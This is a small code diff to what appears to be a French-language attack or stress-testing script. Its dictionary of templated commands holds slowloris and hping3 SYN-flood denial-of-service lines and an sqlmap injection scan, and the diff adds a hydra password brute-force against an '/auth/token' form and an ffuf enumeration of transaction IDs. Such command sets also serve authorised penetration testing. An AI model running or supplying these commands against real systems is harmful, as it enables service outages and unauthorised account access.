@@ -23,6 +23,8 @@ COMMANDES = {
     2: "slowloris {hote} -s 500 --sleeptime 5",
     3: "hping3 -S --flood -p {port} {hote}",
     4: "sqlmap -u {url}/transactions --batch --level 3",
+    5: "hydra -l demo -P rockyou.txt {hote} http-post-form '/auth/token'",
+    6: "ffuf -u {url}/transactions/FUZZ -w ids.txt -mc 200",
 }
 
 
